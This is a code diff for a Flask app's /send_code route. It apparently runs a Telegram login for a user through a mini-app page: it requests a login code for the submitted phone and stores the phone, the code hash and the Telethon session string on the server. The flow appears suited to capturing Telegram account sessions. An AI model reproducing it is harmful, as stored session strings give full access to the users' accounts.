@@ -68,42 +68,37 @@ def index():
 def miniapp():
     return render_template("login.html")
 
-# =====================
-# SEND CODE
-# =====================
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    data = request.json or {}
-    phone_raw = data.get("phone")
+    try:
+        data = request.json or {}
+        phone_raw = data.get("phone")
 
-    if not phone_raw:
-        return jsonify({"status": "error"}), 400
+        if not phone_raw:
+            return jsonify({"status": "error"}), 400
 
-    phone = clean_phone(phone_raw)
+        phone = clean_phone(phone_raw)
 
-    async def _send_code():
-        # 🔥 DOIM YANGI SESSION
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
+        async def _send_code():
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
 
-        # 🔍 TEKSHIRUV (MUHIM!)
-        if await client.is_user_authorized():
-            await client.log_out()
+            if await client.is_user_authorized():
+                await client.log_out()
 
-        sent = await client.send_code_request(phone)
+            sent = await client.send_code_request(phone)
+            print("SEND_CODE DEBUG:", sent)
 
-        print("SEND_CODE DEBUG:", sent)
+            save_login_attempt(
+                phone=phone,
+                phone_code_hash=sent.phone_code_hash,
+                session_string=client.session.save()
+            )
 
-        save_login_attempt(
-            phone=phone,
-            phone_code_hash=sent.phone_code_hash,
-            session_string=client.session.save()
-        )
+            await client.disconnect()
 
-        await client.disconnect()
-
-    run(_send_code())
-    return jsonify({"status": "ok"}), 200
+        run(_send_code())
+        return jsonify({"status": "ok"}), 200
 
     except Exception as e:
         print("SEND_CODE ERROR:", repr(e))
